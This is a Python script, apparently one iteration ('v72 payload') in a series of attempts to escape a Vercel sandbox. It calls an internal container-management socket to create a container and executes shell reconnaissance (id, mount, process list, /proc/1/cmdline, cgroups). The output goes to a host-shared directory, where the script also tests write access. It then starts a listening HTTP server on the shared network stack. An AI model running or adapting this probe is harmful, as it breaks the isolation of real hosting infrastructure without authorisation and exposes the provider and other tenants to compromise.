# -*- coding: utf-8 -*-
"""v72 payload: 验证 Exec 真实执行 — 写宿主共享文件 + drive 容器内起 HTTP 服务 (python3)"""
import socket, time, os, subprocess

OUT = '/vercel/sandbox/v72c.out'
SHARE = '/run/vercel/share'
TEST = SHARE + '/exec_test'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v72c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    log('V72 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V72C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # Exec A: 写宿主共享 + 完整侦察
    cmdA = ('id > /run/vercel/share/exec_test 2>&1; '
            'echo ===HOSTNAME=== >> /run/vercel/share/exec_test; hostname >> /run/vercel/share/exec_test 2>&1; '
            'echo ===PWD=== >> /run/vercel/share/exec_test; pwd >> /run/vercel/share/exec_test 2>&1; '
            'echo ===MOUNT=== >> /run/vercel/share/exec_test; mount >> /run/vercel/share/exec_test 2>&1; '
            'echo ===ROOTLS=== >> /run/vercel/share/exec_test; ls -la / >> /run/vercel/share/exec_test 2>&1; '
            'echo ===CGROUP=== >> /run/vercel/share/exec_test; cat /proc/self/cgroup >> /run/vercel/share/exec_test 2>&1; '
            'echo ===SHARE=== >> /run/vercel/share/exec_test; ls -la /run/vercel/share/ >> /run/vercel/share/exec_test 2>&1; '
            'echo ===PROC1=== >> /run/vercel/share/exec_test; tr "\\0" " " < /proc/1/cmdline >> /run/vercel/share/exec_test 2>&1; '
            'echo ===PROCS=== >> /run/vercel/share/exec_test; ps -ef >> /run/vercel/share/exec_test 2>&1; '
            'echo ===WRITE_TEST=== >> /run/vercel/share/exec_test; '
            'touch /run/vercel/share/write_ok && echo WRITABLE >> /run/vercel/share/exec_test || echo NOWRITE >> /run/vercel/share/exec_test; '
            'echo ===DONE=== >> /run/vercel/share/exec_test')
    st, bd = rpc(CTR + '/Exec', '{"containerId":"%s","process":{"argv":["/bin/sh","-c","%s"]}}' % (cid, cmdA), t=5)
    log('execA -> %s | %s' % (st, bd[:150]))

    # Exec B: drive 容器内起 python3 HTTP 服务 (宿主网络栈共享)
    cmdB = ('/usr/bin/python3 -c "import http.server,socketserver;'
            'http.server.SimpleHTTPRequestHandler.do_GET=lambda s:None;'
            'socketserver.TCPServer((\\"0.0.0.0\\",18081),http.server.SimpleHTTPRequestHandler).serve_forever()"')
    st, bd = rpc(CTR + '/Exec', '{"containerId":"%s","process":{"argv":["/bin/sh","-c","%s"]}}' % (cid, cmdB), t=5)
    log('execB -> %s | %s' % (st, bd[:150]))
    time.sleep(2)

    # 从容器内回连 18081 (容器/宿主共享网络栈)
    try:
        r = subprocess.run(['curl', '-sS', '--max-time', '4', 'http://127.0.0.1:18081/'],
                           capture_output=True, timeout=6)
        log('curl18081 rc=%d out=%s err=%s' % (r.returncode, r.stdout[:150], r.stderr[:100]))
    except Exception as e:
        log('curl18081 EXC %s' % type(e).__name__)

    # 轮询宿主共享输出
    t_wait = 0
    while t_wait < 12:
        time.sleep(1)
        t_wait += 1
        try:
            if os.path.exists(TEST):
                cur = open(TEST, errors='replace').read()
                if cur.strip():
                    log('--- exec_test ---\n%s' % cur[:9000])
                    break
        except Exception:
            pass

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V72C_DONE')


main()
